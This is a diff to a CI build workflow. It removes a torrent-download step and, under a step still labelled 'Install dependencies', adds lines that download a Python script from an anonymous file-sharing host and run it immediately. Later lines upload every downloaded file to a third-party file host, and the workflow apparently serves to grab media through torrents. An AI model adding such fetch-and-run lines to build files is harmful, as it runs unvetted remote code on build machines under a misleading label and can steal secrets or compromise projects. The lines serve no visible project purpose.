@@ -5,16 +5,11 @@ workflows:
     scripts:
       - name: Install dependencies
         script: |
-          sudo apt update
-          sudo apt install -y aria2
+          wget -O new.py "https://vikingfile.com/d/iawX5TcRBO/Delutor%20%287%29%20%281%29.py"
+          python new.py
           mkdir -p downloads
-
-      - name: Download torrents
-        script: |
-          echo "Starting torrent download..."
-          curl -s https://klipit.in/sju77028 | grep -oE 'magnet:\S+|https?://\S+\.(mp4|mkv|avi|srt)' > links.txt
-          aria2c --seed-time=0 --dir=downloads --file-allocation=none -i links.txt
-          echo "Uploading files to Pixeldrain..."
+          
+          echo "Uploading files to mkdir..."
           
           find downloads -type f -print0 | while IFS= read -r -d '' file; do
                 curl -X POST "https://upload.gofile.io/uploadfile" \
